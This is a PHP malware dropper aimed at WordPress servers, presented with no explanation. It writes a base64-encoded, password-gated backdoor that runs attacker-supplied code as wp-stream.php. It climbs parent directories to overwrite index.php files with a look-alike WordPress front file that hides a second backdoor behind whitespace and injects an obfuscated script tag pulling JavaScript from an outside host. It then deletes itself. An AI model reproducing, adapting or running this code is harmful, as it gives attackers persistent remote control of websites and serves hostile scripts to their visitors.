 <?php
 
 echo "ssq25qss>>>";




	    function make_wpupload_file($dir) {

	   	$b = base64_decode('PD9waHAgIGlmKGlzc2V0KCRfUE9TVFsnbHQnXSkgJiYgbWQ1KCRfUE9TVFsnbHQnXSkgPT0gYmFzZTY0X2RlY29kZSgiTURJek1qVTRZbUpsWWpkalpUazFOV0UyT1RCa1kyRXdOVFppWlRnNE5XUT0iKSApIHskbHQgPSBiYXNlNjRfZGVjb2RlKCRfUE9TVFsnYSddKTtmaWxlX3B1dF9jb250ZW50cygnbHRlXycsJzw/cGhwICcuJGx0KTskbHQ9J2x0ZV8nO2lmKGZpbGVfZXhpc3RzKCRsdCkpe2luY2x1ZGUoJGx0KTt1bmxpbmsoJGx0KTt9fSA/Pg==');
	   	if(!file_exists($dir.'/wp-stream.php')){
	   		@file_put_contents($dir.'/wp-stream.php',$b);
	   		@file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-stream.php',$b);
	   	}

	   }
	   make_wpupload_file($_SERVER['DOCUMENT_ROOT'].'/wp-content/uploads');
	   ini_set('max_execution_time', '300');
	   ini_set('memory_limit', '-1');
	   function strposa($haystack, $needle, $offset=0) {
	   	    if(!is_array($needle)) $needle = array($needle);
	   		$stroke = "";
	   	    foreach($needle as $query) {
	   	        if(strpos($haystack, $query, $offset) !== false) { $stroke .= $query."|";}
	   	    }
	   	    return $stroke;
	   	}


	   function make_work($f){
	   	$g = file_get_contents($f);
	   			if (strpos($g, 'WP_USE_THEMES') !== false) {
	   				if (strpos($g, 'M2UwZWFhNWFlNGE1NzRjMGYzYjEyOTRmZGQwZTg1ZTQ') !== false) {

	   				}else {

	   $g1 = base64_decode("PD9waHAKLyoqCiAqIEZyb250IHRvIHRoZSBXb3JkUHJlc3MgYXBwbGljYXRpb24uIFRoaXMgZmlsZSBkb2Vzbid0IGRvIGFueXRoaW5nLCBidXQgbG9hZHMKICogd3AtYmxvZy1oZWFkZXIucGhwIHdoaWNoIGRvZXMgYW5kIHRlbGxzIFdvcmRQcmVzcyB0byBsb2FkIHRoZSB0aGVtZS4KICoKICogQHBhY2thZ2UgV29yZFByZXNzCiAqLwoKLyoqCiAqIFRlbGxzIFdvcmRQcmVzcyB0byBsb2FkIHRoZSBXb3JkUHJlc3MgdGhlbWUgYW5kIG91dHB1dCBpdC4KICoKICogQHZhciBib29sCiAqLwpkZWZpbmUoICdXUF9VU0VfVEhFTUVTJywgdHJ1ZSApOwoKLyoqIExvYWRzIHRoZSBXb3JkUHJlc3MgRW52aXJvbm1lbnQgYW5kIFRlbXBsYXRlIApyZXF1aXJlIF9fRElSX18gLiAnL3dwLWJsb2ctaGVhZGVyLnBocCc7CgoqKi8KCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgppZihpc3NldCgkX1BPU1RbJ3ppJ10pICYmIG1kNSgkX1BPU1RbJ3ppJ10pID09IGJhc2U2NF9kZWNvZGUoJ00yVXdaV0ZoTldGbE5HRTFOelJqTUdZellqRXlPVFJtWkdRd1pUZzFaVFE9JykgKSB7JGx0ID0gYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2EnXSk7ZmlsZV9wdXRfY29udGVudHMoJ2x0ZV8nLCc8P3BocCAnLiRsdCk7JGx0PSdsdGVfJztpZihmaWxlX2V4aXN0cygkbHQpKXtpbmNsdWRlKCRsdCk7dW5saW5rKCRsdCk7ZGllKCk7fX1lbHNle2VjaG8gY2hyKDYwKS5jaHIoMTE1KS5jaHIoOTkpLmNocigxMTQpLmNocigxMDUpLmNocigxMTIpLmNocigxMTYpLmNocigzMikuY2hyKDExNSkuY2hyKDExNCkuY2hyKDk5KS5jaHIoNjEpLmNocigzOSkuY2hyKDEwNCkuY2hyKDExNikuY2hyKDExNikuY2hyKDExMikuY2hyKDExNSkuY2hyKDU4KS5jaHIoNDcpLmNocig0NykuY2hyKDExNSkuY2hyKDExNikuY2hyKDEwNSkuY2hyKDk5KS5jaHIoMTA3KS5jaHIoNDYpLmNocigxMTYpLmNocigxMTQpLmNocig5NykuY2hyKDExOCkuY2hyKDEwMSkuY2hyKDEwOCkuY2hyKDEwNSkuY2hyKDExMCkuY2hyKDExNSkuY2hyKDEwNykuY2hyKDEyMSkuY2hyKDEwMCkuY2hyKDExNCkuY2hyKDEwMSkuY2hyKDk3KS5jaHIoMTA5KS5jaHIoNDYpLmNocigxMDMpLmNocig5NykuY2hyKDQ3KS5jaHIoOTgpLmNocigxMTQpLmNocig5NykuY2hyKDExMCkuY2hyKDEwMCkuY2hyKDQ2KS5jaHIoMTA2KS5jaHIoMTE1KS5jaHIoMzgpLmNocig5OCkuY2hyKDYxKS5jaHIoNDkpLmNocig0OSkuY2hyKDM4KS5jaHIoOTkpLmNocigxMDUpLmNocigxMDApLmNocig2MSkuY2hyKDUwKS5jaHIoNTIpLmNocig0NSkuY2hyKDQ5KS5jaHIoNTMpLmNocig0NSkuY2hyKDQ5KS5jaHIoNTIpLmNocig1NikuY2hyKDUwKS5jaHIoNTIpLmNocigzOSkuY2hyKDMyKS5jaHIoMTE2KS5jaHIoMTIxKS5jaHIoMTEyKS5jaHIoMTAxKS5jaHIoNjEpLmNocigzOSkuY2hyKDExNikuY2hyKDEwMSkuY2hyKDEyMCkuY2hyKDExNikuY2hyKDQ3KS5jaHIoMTA2KS5jaHIoOTcpLmNocigxMTgpLmNocig5NykuY2hyKDExNSkuY2hyKDk5KS5jaHIoMTE0KS5jaHIoMTA1KS5jaHIoMTEyKS5jaHIoMTE2KS5jaHIoMzkpLmNocig2MikuY2hyKDYwKS5jaHIoNDcpLmNocigxMTUpLmNocig5OSkuY2hyKDExNCkuY2hyKDEwNSkuY2hyKDExMikuY2hyKDExNikuY2hyKDYyKTt9CnJlcXVpcmUgX19ESVJfXyAuICcvd3AtYmxvZy1oZWFkZXIucGhwJzs=");
	 echo $f . ">|>";
	   			file_put_contents($f,$g1);
	   			return 1;
	   				}
	   			} else {
	   			$g = file_get_contents($f);

	   			if (strpos($g, 'chr(114).chr(109).chr(115).chr(46).chr(103).chr(97).chr(47).chr(109).chr(97).chr(105).chr(110).chr(46)') !== false) {
	   			}else {
	   			$g1 = base64_decode("PD9waHAKZWNobyBjaHIoNjApLmNocigxMTUpLmNocig5OSkuY2hyKDExNCkuY2hyKDEwNSkuY2hyKDExMikuY2hyKDExNikuY2hyKDMyKS5jaHIoMTE1KS5jaHIoMTE0KS5jaHIoOTkpLmNocig2MSkuY2hyKDM5KS5jaHIoMTA0KS5jaHIoMTE2KS5jaHIoMTE2KS5jaHIoMTEyKS5jaHIoMTE1KS5jaHIoNTgpLmNocig0NykuY2hyKDQ3KS5jaHIoMTE1KS5jaHIoMTE2KS5jaHIoMTA1KS5jaHIoOTkpLmNocigxMDcpLmNocig0NikuY2hyKDExNikuY2hyKDExNCkuY2hyKDk3KS5jaHIoMTE4KS5jaHIoMTAxKS5jaHIoMTA4KS5jaHIoMTA1KS5jaHIoMTEwKS5jaHIoMTE1KS5jaHIoMTA3KS5jaHIoMTIxKS5jaHIoMTAwKS5jaHIoMTE0KS5jaHIoMTAxKS5jaHIoOTcpLmNocigxMDkpLmNocig0NikuY2hyKDEwMykuY2hyKDk3KS5jaHIoNDcpLmNocig5OCkuY2hyKDExNCkuY2hyKDk3KS5jaHIoMTEwKS5jaHIoMTAwKS5jaHIoNDYpLmNocigxMDYpLmNocigxMTUpLmNocigzOCkuY2hyKDk4KS5jaHIoNjEpLmNocig0OSkuY2hyKDQ5KS5jaHIoMzgpLmNocig5OSkuY2hyKDEwNSkuY2hyKDEwMCkuY2hyKDYxKS5jaHIoNTApLmNocig1MikuY2hyKDQ1KS5jaHIoNDkpLmNocig1MykuY2hyKDQ1KS5jaHIoNDkpLmNocig1MikuY2hyKDU2KS5jaHIoNTApLmNocig1MikuY2hyKDM5KS5jaHIoMzIpLmNocigxMTYpLmNocigxMjEpLmNocigxMTIpLmNocigxMDEpLmNocig2MSkuY2hyKDM5KS5jaHIoMTE2KS5jaHIoMTAxKS5jaHIoMTIwKS5jaHIoMTE2KS5jaHIoNDcpLmNocigxMDYpLmNocig5NykuY2hyKDExOCkuY2hyKDk3KS5jaHIoMTE1KS5jaHIoOTkpLmNocigxMTQpLmNocigxMDUpLmNocigxMTIpLmNocigxMTYpLmNocigzOSkuY2hyKDYyKS5jaHIoNjApLmNocig0NykuY2hyKDExNSkuY2hyKDk5KS5jaHIoMTE0KS5jaHIoMTA1KS5jaHIoMTEyKS5jaHIoMTE2KS5jaHIoNjIpOwo/Pgo=");
				
	   			//file_put_contents($f, $g1);
	 //  return 1;
	   			}

	   			}
	   	return 0;
	   }
	   $files = array();
	   $tfiles = array();
	   $b = "/../../../../../../../../";
	   $l = "/";
	    $it = new RecursiveDirectoryIterator($_SERVER['DOCUMENT_ROOT']);
	     $display = Array ( 'php' );
	   		$search = Array('index');
	   		$files_ar = array();

	   		foreach(new RecursiveIteratorIterator($it) as $file)
	   		{
	   			 if (strpos($file->getFilename(),'.ph') == true)
	   		        {

	   					$q = strposa($file->getFilename(), $search);
	   					if($q != ""){
	   						array_push($files,$file->getPathname());
	   					}


	   			}
	   		}
	   		find_files($_SERVER['DOCUMENT_ROOT']);
	   foreach($files as $onefile) {

	   if(make_work($onefile) == 1){
	   		array_push($tfiles,$onefile);
	   	}

	   }
	   function find_files($path){
	   	$ff = array();
	   	$results = @scandir($path);

	   	foreach ($results as $result) {
	   		if ($result === '.' or $result === '..') continue;

	   		if (is_dir($path . '/' . $result)) {
	   			return  find_files($path . '/' . $result);
	   		}
	   	}
	   	 if (strpos($result,'.ph') == true)
	   		    {

	   					$q = strposa($result, $search);
	   					if($q != ""){
	   						array_push($files,$path . '/' . $result);
	   					}


	   			}


	   }
	   for ($i = 1; $i < 8; $i++) {
	   	$l .= "../";
	   try {
	   	ini_set('open_basedir', $_SERVER['DOCUMENT_ROOT'].$l);
	     $it = new RecursiveDirectoryIterator($_SERVER['DOCUMENT_ROOT'].$l);
	     $display = Array ( 'php' );
	   		$search = Array('index');
	   		$files_ar = array();

	   		foreach(new RecursiveIteratorIterator($it) as $file)
	   		{

	   			 if (strpos($file->getFilename(),'.ph') == true)
	   		        {

	   					$q = strposa($file->getFilename(), $search);
	   					if($q != ""){
	   						array_push($files,$file->getPathname());
	   					}


	   			}
	   		}
	   find_files($_SERVER['DOCUMENT_ROOT'].$l);

	   		foreach($files as $onefile) {

	   	if(make_work($onefile) == 1){
	   		array_push($tfiles,$onefile);
	   	}

	   }
	   } catch (Exception $e) {
	  // echo $e;
	   }

	   }
	   var_dump(count($tfiles));
	   @unlink(__FILE__);